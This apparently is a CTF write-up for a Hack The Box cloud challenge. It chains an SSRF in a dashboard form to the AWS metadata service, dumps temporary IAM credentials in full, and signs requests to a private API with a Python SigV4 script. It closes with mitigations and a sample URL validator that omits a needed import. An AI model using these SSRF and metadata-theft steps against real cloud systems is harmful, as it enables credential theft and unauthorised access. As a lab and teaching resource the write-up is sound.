# Dashboarded - CTF Write-Up

## Challenge Overview

**Challenge Name:** Dashboarded  
**Category:** Cloud Security / Web Security  
**Difficulty:** very easy  
**Flag:** `HTB{d4sh1nG_tHr0ugH_DaSHbO4rDs}`

This CTF challenge involves a cloud dashboard for critical infrastructure control. The goal is to exploit vulnerabilities in the web application to gain access to sensitive information and retrieve the flag.

## Initial Reconnaissance

### Step 1: Explore the Web Application
First, let's examine what we're dealing with by visiting the target:

```bash
curl -s "http://3.15.107.79" | head -30
```

This reveals a web application called "Empire of Volnaya | ICS Dashboard" with the subtitle "Operation Blackout - Critical Infrastructure Control". Key observations:

- It's an Industrial Control System (ICS) dashboard
- Shows various infrastructure systems (Power Plants, Water Treatment, etc.)
- Has status indicators showing system health
- Contains operational logs mentioning "SSRF exploit success" - this is a major hint!

### Step 2: Analyze the HTML Structure
Let's examine the full HTML to understand the application structure:

```bash
curl -s "http://3.15.107.79" > /tmp/dashboard.html
cat /tmp/dashboard.html
```

Key findings:
- There's a form with `method="post"`
- Hidden input field: `<input type="hidden" name="url" value="https://inyunqef0e.execute-api.us-east-2.amazonaws.com/api/status">`
- The form submits to the same page
- There's an AWS API Gateway endpoint: `https://inyunqef0e.execute-api.us-east-2.amazonaws.com/api/status`

### Step 3: Test the Normal Functionality
Let's see what the normal form submission does:

```bash
curl -X POST -d "url=https://inyunqef0e.execute-api.us-east-2.amazonaws.com/api/status" "http://3.15.107.79"
```

This returns the normal dashboard page, confirming the form works.

### Step 4: Discover API Endpoints
Let's test the AWS API Gateway directly:

```bash
# Test public endpoint
curl -s "https://inyunqef0e.execute-api.us-east-2.amazonaws.com/api/status"
```

Response:
```json
[{"name": "Power Plant Zeta-7", "status": "critical", "message": "Power Grid Disruption"}, {"name": "Water Treatment Facility Delta-9", "status": "operational", "message": "All checks OK"}, {"name": "Factory Alpha-12", "status": "warning", "message": "Minor Systems Failure"}]
```

```bash
# Test private endpoint
curl -s "https://inyunqef0e.execute-api.us-east-2.amazonaws.com/api/private"
```

Response:
```json
{"message":"Missing Authentication Token"}
```

```bash
# Check root API
curl -s "https://inyunqef0e.execute-api.us-east-2.amazonaws.com/api/"
```

Response:
```json
{"endpoints": ["/status", "/private"]}
```

**Key Discovery**: We have a public `/status` endpoint and a private `/private` endpoint that requires authentication.

## Exploiting the Vulnerability

### Step 5: Identify Server-Side Request Forgery (SSRF)
The operations log mentioned "SSRF exploit success" which is a huge hint. The form accepts a URL parameter, suggesting the server fetches content from user-provided URLs.

Let's test if we can make the server request the private endpoint:

```bash
curl -X POST -d "url=https://inyunqef0e.execute-api.us-east-2.amazonaws.com/api/private" "http://3.15.107.79"
```

In the response, we see "Invalid JSON data:" which means the server tried to fetch the private endpoint but couldn't parse the authentication error as JSON. **This confirms SSRF is working!**

### Step 6: Access AWS Instance Metadata
Since this appears to be running on AWS (based on the API Gateway URL), let's try accessing the AWS instance metadata service:

```bash
curl -X POST -d "url=http://169.254.169.254/latest/meta-data/" "http://3.15.107.79"
```

**Success!** The response shows:
```
Invalid JSON data: ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
events/
hostname
iam/
identity-credentials/
instance-action
instance-id
...
```

The presence of `iam/` indicates there are IAM roles available!

### Step 7: Enumerate IAM Security Credentials
Let's check what IAM roles are available:

```bash
curl -X POST -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" "http://3.15.107.79"
```

Response shows:
```
Invalid JSON data: APICallerRole
```

Perfect! There's an IAM role called "APICallerRole".

### Step 8: Extract AWS Credentials
Now let's get the actual credentials for this role:

```bash
curl -X POST -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/APICallerRole" "http://3.15.107.79"
```

The response contains (extracted from "Invalid JSON data:" entries):
- **Access Key ID**: `ASIARHJJMXKMXO77HYYK`
- **Secret Access Key**: `gl0jeG+GWR/00dgczsXpMoKzs4bqSn/h66t3GDWT`
- **Session Token**: `IQoJb3JpZ2luX2VjEH4aCXVzLWVhc3QtMiJHMEUCIFGN7mAJBwvs8BKezwJakDsq2ihIQ5u/P1V4EAtMbjWkAiEAhAQN9ch2cP5LlY6KUtUNaTXqMzbTKAnruaURQwmofpcquwUISBAAGgwwODQzNzU1NTA2MTciDGkZBlVUVTfupm8ZpSqYBWttkHhR+MV4Vux+u1xiQBkPfYTzFCDHppXdRvnvPII3coqOZJ2zMHOgI1Z+FW57H0oivMEgcsjsknTBc+Id+1hxpxgGdzJAN54xULUh80joVc5yHRJRf4H5g5ZVk/Q+mpTx4iQXDdk6W2iJTugaJvgGKMW9BSfPfNYQSzGFpiL0etWUvVcrU2YQwFb0lqn+ODiXlfLUjFSVk0y65LgOdqLcNWmg8DIQSTx5KpyUwlYhSoWGo9yFojE8Thxw+UgEH5hvzIFJHTZ7188bTRvN4qySsmhwhZAI7+kGudEUFkseifZhLOR3iQybgX+Pua1Cp0uGPj6oTR/F1Tjryr4hPl3FCzEzRvTrKr9aCc6+j0oOeom8VV4IzBDyjOW0vHBhwVCgwbYEk/k9c8rSIGpXKGwsfGW/GZsmY4iF62gxJnGuopuuFRw0qbm6FPH6uWSQn6U+YU2g1CBQZcOe9NMDm8p5gVki7pI0ORfnU/C6FSbQ4zF06ewTXA64Dm9trxW5OeJNIayyRa7EpPyyOBV48JXSCwkcB5O5SHFbP1mkX/7us8hyAb1uGKkB7yKWEpoZ72rsE7gDqnUQsvXyWD2Z1TygvLTaxUUpGONhpp3Skt8Kyr9dHv6FgiOK/Pltr2r8PdZIRAEfJXUA/K4dzkL8mQBpthYVpyAc+1rqs7YZ/YJ7Z+vdo/2/F6kcm1ADLGZpTOU0dOjJCNnNQ71clSNj3k5Uj55Wx3NkBT/bIdjwyLk+LW2xhIDXGpt6S4HMiS+sBVVKN9JLhD9Hz7iKjoOKDG2hjMpiJ4+9/UHidKj1xZkN+FgC0a4G8beu9DIOFgpwNF5o90oNLLKK5Ct23zWKDUPGXavgwOCk6bp134w007adCPPrMnBbCjsw7vXRwQY6sQEleycJ2R2ZC90HeJ+Gb2ibKrNFXcLYKNE4QNcO5uszSThtJjNxQK0es5/hSS+f+9CcIwGyqq3Cft1LjsXTwXEE73CHl2+gND9gPO7CHqE6YqFm90QKHB3OCJ535UgUzMJniei8+XEc9xJxrqkDUFrvPKQcHxNl9w6guUi8cRBgfKpD9AsbeaGG8NEBCeThnhF46dGS/sG/SIFcLaV/QhNGCNpq6OvqRqm4WgST2EZ0PXg=`

## Accessing the Private API

### Step 9: Create AWS Signed Request
AWS API Gateway requires properly signed requests using AWS Signature Version 4. Let's create a Python script to generate the correct signature:

```python
#!/usr/bin/env python3
import hashlib
import hmac
import urllib.parse
from datetime import datetime
import requests

def sign(key, msg):
    return hmac.new(key, msg.encode('utf-8'), hashlib.sha256).digest()

def getSignatureKey(key, dateStamp, regionName, serviceName):
    kDate = sign(('AWS4' + key).encode('utf-8'), dateStamp)
    kRegion = sign(kDate, regionName)
    kService = sign(kRegion, serviceName)
    kSigning = sign(kService, 'aws4_request')
    return kSigning

# AWS credentials from SSRF
access_key = 'ASIARHJJMXKMXO77HYYK'
secret_key = 'gl0jeG+GWR/00dgczsXpMoKzs4bqSn/h66t3GDWT'
session_token = 'IQoJb3JpZ2luX2VjEH4aCXVzLWVhc3QtMiJHMEUCIFGN7mAJBwvs8BKezwJakDsq2ihIQ5u/P1V4EAtMbjWkAiEAhAQN9ch2cP5LlY6KUtUNaTXqMzbTKAnruaURQwmofpcquwUISBAAGgwwODQzNzU1NTA2MTciDGkZBlVUVTfupm8ZpSqYBWttkHhR+MV4Vux+u1xiQBkPfYTzFCDHppXdRvnvPII3coqOZJ2zMHOgI1Z+FW57H0oivMEgcsjsknTBc+Id+1hxpxgGdzJAN54xULUh80joVc5yHRJRf4H5g5ZVk/Q+mpTx4iQXDdk6W2iJTugaJvgGKMW9BSfPfNYQSzGFpiL0etWUvVcrU2YQwFb0lqn+ODiXlfLUjFSVk0y65LgOdqLcNWmg8DIQSTx5KpyUwlYhSoWGo9yFojE8Thxw+UgEH5hvzIFJHTZ7188bTRvN4qySsmhwhZAI7+kGudEUFkseifZhLOR3iQybgX+Pua1Cp0uGPj6oTR/F1Tjryr4hPl3FCzEzRvTrKr9aCc6+j0oOeom8VV4IzBDyjOW0vHBhwVCgwbYEk/k9c8rSIGpXKGwsfGW/GZsmY4iF62gxJnGuopuuFRw0qbm6FPH6uWSQn6U+YU2g1CBQZcOe9NMDm8p5gVki7pI0ORfnU/C6FSbQ4zF06ewTXA64Dm9trxW5OeJNIayyRa7EpPyyOBV48JXSCwkcB5O5SHFbP1mkX/7us8hyAb1uGKkB7yKWEpoZ72rsE7gDqnUQsvXyWD2Z1TygvLTaxUUpGONhpp3Skt8Kyr9dHv6FgiOK/Pltr2r8PdZIRAEfJXUA/K4dzkL8mQBpthYVpyAc+1rqs7YZ/YJ7Z+vdo/2/F6kcm1ADLGZpTOU0dOjJCNnNQ71clSNj3k5Uj55Wx3NkBT/bIdjwyLk+LW2xhIDXGpt6S4HMiS+sBVVKN9JLhD9Hz7iKjoOKDG2hjMpiJ4+9/UHidKj1xZkN+FgC0a4G8beu9DIOFgpwNF5o90oNLLKK5Ct23zWKDUPGXavgwOCk6bp134w007adCPPrMnBbCjsw7vXRwQY6sQEleycJ2R2ZC90HeJ+Gb2ibKrNFXcLYKNE4QNcO5uszSThtJjNxQK0es5/hSS+f+9CcIwGyqq3Cft1LjsXTwXEE73CHl2+gND9gPO7CHqE6YqFm90QKHB3OCJ535UgUzMJniei8+XEc9xJxrqkDUFrvPKQcHxNl9w6guUi8cRBgfKpD9AsbeaGG8NEBCeThnhF46dGS/sG/SIFcLaV/QhNGCNpq6OvqRqm4WgST2EZ0PXg='

# API details
method = 'GET'
service = 'execute-api'
host = 'inyunqef0e.execute-api.us-east-2.amazonaws.com'
region = 'us-east-2'
endpoint = 'https://inyunqef0e.execute-api.us-east-2.amazonaws.com/api/private'

# Create timestamp
t = datetime.utcnow()
amzdate = t.strftime('%Y%m%dT%H%M%SZ')
datestamp = t.strftime('%Y%m%d')

# Create canonical request
canonical_uri = '/api/private'
canonical_querystring = ''
canonical_headers = 'host:' + host + '\n' + 'x-amz-date:' + amzdate + '\n'
if session_token:
    canonical_headers += 'x-amz-security-token:' + session_token + '\n'

signed_headers = 'host;x-amz-date'
if session_token:
    signed_headers += ';x-amz-security-token'

payload_hash = hashlib.sha256(''.encode('utf-8')).hexdigest()
canonical_request = method + '\n' + canonical_uri + '\n' + canonical_querystring + '\n' + canonical_headers + '\n' + signed_headers + '\n' + payload_hash

# Create string to sign
algorithm = 'AWS4-HMAC-SHA256'
credential_scope = datestamp + '/' + region + '/' + service + '/' + 'aws4_request'
string_to_sign = algorithm + '\n' +  amzdate + '\n' +  credential_scope + '\n' +  hashlib.sha256(canonical_request.encode('utf-8')).hexdigest()

# Calculate signature
signing_key = getSignatureKey(secret_key, datestamp, region, service)
signature = hmac.new(signing_key, string_to_sign.encode('utf-8'), hashlib.sha256).hexdigest()

# Create authorization header
authorization_header = algorithm + ' ' + 'Credential=' + access_key + '/' + credential_scope + ', ' +  'SignedHeaders=' + signed_headers + ', ' + 'Signature=' + signature

# Make request
headers = {
    'x-amz-date': amzdate,
    'Authorization': authorization_header
}
if session_token:
    headers['x-amz-security-token'] = session_token

print("Making request to:", endpoint)
response = requests.get(endpoint, headers=headers)
print("Status Code:", response.status_code)
print("Response:", response.text)
```

### Step 10: Execute the Attack
Save the script as `/tmp/aws_request.py` and run it:

```bash
python3 /tmp/aws_request.py
```

## Flag Retrieved!

**🎉 SUCCESS!**

The script returns a 200 status code and a JSON response containing detailed information about various infrastructure systems. Buried in the response is:

```json
{"flag": "HTB{d4sh1nG_tHr0ugH_DaSHbO4rDs}"}
```

## Vulnerability Analysis

### Root Cause
This challenge demonstrates a classic cloud security vulnerability chain:

1. **Server-Side Request Forgery (SSRF)**: The web application accepts user-provided URLs and fetches content from them without proper validation
2. **AWS Metadata Service Access**: SSRF allows access to the AWS instance metadata service at `169.254.169.254`
3. **IAM Credential Theft**: The metadata service exposes temporary AWS credentials for the instance's IAM role
4. **Privilege Escalation**: The stolen credentials allow access to private API endpoints

### Attack Flow
```
User Input → SSRF → AWS Metadata → IAM Credentials → Private API → Flag
```

1. **SSRF Discovery**: Form accepts URL parameter and server fetches content
2. **Metadata Enumeration**: Access `http://169.254.169.254/latest/meta-data/`
3. **IAM Role Discovery**: Find available IAM roles via metadata service
4. **Credential Extraction**: Retrieve temporary AWS credentials
5. **API Authentication**: Use credentials to create properly signed AWS requests
6. **Data Exfiltration**: Access private API endpoints to retrieve sensitive data

### Impact
- **Information Disclosure**: Access to sensitive infrastructure data
- **Credential Theft**: Temporary AWS credentials can be used for further attacks
- **Privilege Escalation**: Access to private APIs and resources
- **Potential for Lateral Movement**: Credentials could be used to access other AWS services

## Mitigation Strategies

### For Developers
1. **Input Validation**: Restrict URL schemes to `http://` and `https://` only
2. **URL Filtering**: Block access to private IP ranges (169.254.x.x, 127.x.x.x, 10.x.x.x, etc.)
3. **Metadata Service Protection**: Use IMDSv2 and disable IMDSv1
4. **Least Privilege**: Limit IAM role permissions to minimum required
5. **Network Segmentation**: Isolate web applications from sensitive services

### For Cloud Infrastructure
1. **IMDSv2 Enforcement**: Require session tokens for metadata access
2. **WAF Rules**: Implement Web Application Firewall rules to detect SSRF
3. **VPC Security**: Use private subnets and security groups effectively
4. **Monitoring**: Log and monitor metadata service access
5. **IAM Policies**: Implement strict IAM policies with time-based conditions

### Example Secure Implementation
```python
import urllib.parse
import ipaddress

def is_safe_url(url):
    try:
        parsed = urllib.parse.urlparse(url)
        
        # Only allow HTTP/HTTPS
        if parsed.scheme not in ['http', 'https']:
            return False
            
        # Resolve hostname to IP
        ip = ipaddress.ip_address(socket.gethostbyname(parsed.hostname))
        
        # Block private IPs
        if ip.is_private or ip.is_loopback or ip.is_link_local:
            return False
            
        # Block metadata service
        if str(ip) == "169.254.169.254":
            return False
            
        return True
    except:
        return False
```

## Tools and Techniques Used

- **curl**: HTTP client for web requests and API testing
- **Python**: Custom script for AWS signature generation
- **AWS Signature V4**: Authentication mechanism for AWS services
- **SSRF**: Server-Side Request Forgery exploitation
- **Cloud Metadata**: AWS instance metadata service enumeration
- **JSON Analysis**: Parsing and extracting data from API responses

## Write-Up Credit: [binchickens69](https://ctf.hackthebox.com/user/profile/605069)